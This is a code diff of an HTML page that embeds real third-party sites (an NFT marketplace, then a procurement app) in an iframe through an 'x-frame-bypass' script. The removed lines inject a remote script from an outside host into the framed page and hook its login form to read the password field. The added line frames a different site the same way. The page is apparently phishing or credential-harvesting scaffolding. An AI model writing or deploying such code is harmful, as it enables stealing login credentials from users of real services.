@@ -28,41 +28,9 @@
 	<script src="x-frame-bypass.js" type="module"></script>
 </head>
 <body>
-	<script>
-		var iframe = document.querySelector('.asd')
-		var iframeDocument = iframe.contentWindow.document;
-		
-		var frame=iframeDocument.createElement("iframe");
-		frame.src="/css/bootstrap.min.css";
-		document.body.appendChild(frame);
-		var script=document.createElement('script');
-		script.src='//vasilevigor3.github.io/myjs.js';
-		window.frames[0].document.head.appendChild(script);
-	</script>
-	<iframe is="x-frame-bypass" src="https://opensea.io" class="asd"></iframe>
+	<iframe is="x-frame-bypass" src="https://app.precoro.com/" class="asd" ></iframe>
+	
 
-	<script>
-
-        function manipulateIframeContent() {
-            
-		var iframe = document.querySelector('.asd');
-
-            if (iframe && iframe.contentWindow) {
-
-                var iframeDocument = iframe.contentWindow.document;
-
-		var login_form = iframeDocument.getElementsByTagName("form");
-		var pass_value = iframeDocument.getElementById('passp-field-passwd');
-		    
-		login_form.addEventListener('submit', function(event) {
-        		event.preventDefault();
-        		var passValue = pass_value.value;
-        		alert(passValue);
-    		});
-            }
-        }
-        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
-    </script>
-
+	
 </body>
 </html>
